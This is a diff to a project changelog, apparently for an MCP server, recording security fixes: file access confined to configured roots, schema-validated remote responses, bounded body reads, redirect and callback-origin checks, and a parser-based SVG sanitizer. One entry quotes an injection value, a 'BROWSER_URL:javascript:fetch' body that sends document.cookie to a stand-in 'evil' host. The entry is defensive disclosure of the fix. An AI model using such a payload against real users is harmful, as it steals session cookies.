@@ -7,8 +7,59 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ## [Unreleased]
 
+### Fixed
+
+- **`magic_component_refiner` did not work in any released 2.x version.** It called
+  `PathValidator.validate(path, "/")`, and `path.resolve("/") + path.sep` is `"//"`, which no
+  absolute path begins with — so every real path was refused and the tool returned an error
+  before any I/O, blaming the API key. The suite was 398 green over it because
+  `tool-contract.test.ts` asserts `tools/list` metadata and executes no tool. If you tried to
+  refine a component with this package and were told to check your API key, the API key was
+  not the problem.
+
 ### Security
 
+- **Tool file access is confined to configured roots.** `Config.allowedRoots` defaults to the
+  working directory and is set by `ALLOWED_ROOTS`, a `path.delimiter`-separated list accepted
+  as an environment variable or as a CLI argument in the same forms as `MAX_FILE_SIZE` and
+  `MAX_BODY_SIZE`. Every root is resolved to an absolute path at configuration time, and an empty root or the filesystem root is refused — the base that
+  confines nothing cannot be configured. `PathValidator.validate` now takes a set of roots
+  rather than one base, so `validate(path, "/")` — a legal call that disabled the whole check —
+  is no longer expressible. `magic_component_builder` reports a refused path to the caller and
+  logs it at `warn` naming the path, instead of swallowing it in a `catch {}` and sending an
+  empty `fileContent`, and it applies the existing `maxFileSize` to a read that had no bound.
+- **Every remote response is validated against a schema before any field of it is read.**
+  `HttpClient.get`/`post` take a required `zod` schema and return a discriminated
+  `HttpResult<T>` whose failure branch carries no `data` at all, replacing
+  `(await response.json()) as T` — a cast, not a validation — and `null as T`, which let
+  `ok === true` coexist with `data === null`. The schema runs on every path that yields a
+  value; an error status no longer produces one.
+- **Failures are reported by kind, never by remote text.** Seven `FailureKind`s each map to a
+  constant client-facing message with no interpolation slot, so no response body, error message
+  or `statusText` can reach the MCP client. The remote detail goes to the local log at `error`.
+  This closes the `statusText` that `magic_logo_search` previously forwarded verbatim, and the
+  refusal reasons that carried a remote-chosen hostname into the failed-query report.
+- **Response bodies are size-bounded**, checked against `content-length` *and* against the
+  accumulated bytes, because `content-length` is remote-supplied and may lie. A body declaring
+  12 bytes ahead of 16 MB is abandoned one chunk past the limit rather than read whole.
+- **The request deadline now covers the body read.** The abort timer was cleared once headers
+  arrived, leaving a trickling body without one; a single such response stalled a whole
+  `magic_logo_search` batch, including queries that had already succeeded.
+- **Redirects are refused when a hop leaves the configured service origin**, on every hop
+  rather than the first. `fetch` follows redirects by default, which made the origin of a body
+  a property of the response chain rather than of the service that was asked.
+- **The callback server refuses a request with no `Origin`.** Absence was treated as
+  permission, so a plain loopback POST returned `200` and its payload reached the agent
+  byte-identical. The localhost allowlist is now opt-in through `ALLOW_LOCALHOST_ORIGIN`
+  rather than a default, so a page on the user's own dev server cannot answer.
+- **The callback body is validated before it resolves anything**, so a raw string can no longer
+  become a tool's whole output. A rejected body leaves the single-use window open for a
+  legitimate reply.
+- **The channel discriminator left the payload.** The `BROWSER_URL:` prefix is replaced by a
+  discriminated result the callback cannot forge, and a callback-derived URL is emitted only
+  when its scheme is `https` — a body of
+  `BROWSER_URL:javascript:fetch('http://evil/'+document.cookie)` previously produced exactly
+  that URL inside a markdown link.
 - **SVG sanitization is parser-based** (`src/security/svg-sanitizer.ts`). Markup is parsed
   with Bun's native `HTMLRewriter` and re-emitted from an explicit allowlist of elements and
   attributes, replacing the regular-expression filter that 2.0.0 shipped. That filter was
@@ -36,8 +87,21 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 - **A fail-closed sanitizer result is reported as a failure**, not as a found logo. An empty
   or fully-rejected SVG previously produced `() => ()`, which does not parse.
 
+### Added
+
+- **Every tool is executed through a real `McpServer` + `Client` pair** in
+  `src/__tests__/server/tool-execution.test.ts`, asserting an observable result rather than the
+  absence of an exception. The existing contract test checks `tools/list` metadata and executes
+  nothing, which is how a completely broken tool survived 398 green tests. Confirmed to
+  discriminate rather than merely pass: against the pre-story commit it is 7 pass / 1 fail, the
+  one failure being the refiner.
+
 ### Changed
 
+- Error objects now format usefully in the log. `Logger` JSON-stringified its arguments, and
+  `JSON.stringify(new Error(...))` is `{}`, so every "the server log has the detail" line
+  recorded nothing. Message, own properties, cause chain and top frames are now emitted, still
+  passed through `LogSanitizer`.
 - The SVG sanitizer moved from `src/http/` to `src/security/`, beside `log-sanitizer`,
   `path-validator`, `rate-limiter` and `shell-sanitizer`. Being the only sanitizer outside
   that directory is part of why it went unreviewed.
